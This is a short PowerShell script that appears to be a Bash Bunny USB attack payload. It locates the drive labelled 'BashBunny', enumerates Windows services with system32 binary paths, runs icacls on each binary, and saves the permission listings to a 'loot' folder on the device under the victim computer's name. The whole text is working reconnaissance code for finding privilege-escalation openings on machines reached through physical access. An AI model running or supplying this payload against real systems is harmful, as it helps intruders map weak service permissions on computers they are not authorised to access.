$drive = (gwmi win32_volume -f 'label="BashBunny"' | Select-Object -ExpandProperty DriveLetter)

ForEach ($item in (wmic service list full | Select-String -Pattern "PathName" | Select-String -Pattern "system32")) {
$file = $item.ToString($item)
icacls.exe $file.Split("=")[1].split(' ')[0] | Out-File -Append $drive\\loot\\GetServicePerm\\\$env:computername.txt
}


